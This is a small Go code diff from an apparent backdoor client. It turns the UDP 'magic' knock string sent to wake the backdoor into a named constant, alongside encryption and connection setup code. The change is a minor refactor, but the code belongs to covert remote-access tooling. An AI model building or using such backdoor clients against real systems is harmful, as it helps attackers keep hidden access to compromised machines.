@@ -20,6 +20,8 @@ import (
 
 var pwd bool = false
 
+const UDPMAGIC = "!@fizzbuzz@!"
+
 func seal(msg []byte, info []byte, gcm cipher.AEAD) []byte {
 	nonce := make([]byte, gcm.NonceSize())
 	rand.Read(nonce)
@@ -104,7 +106,7 @@ func main() {
 		fmt.Println("Error dialing the backdoor, exiting...")
 		os.Exit(1)
 	}
-	udp.Write([]byte("!@fizzbuzz@!"))
+	udp.Write([]byte(UDPMAGIC))
 	udp.Close()
 	var conn net.Conn
 	var err error
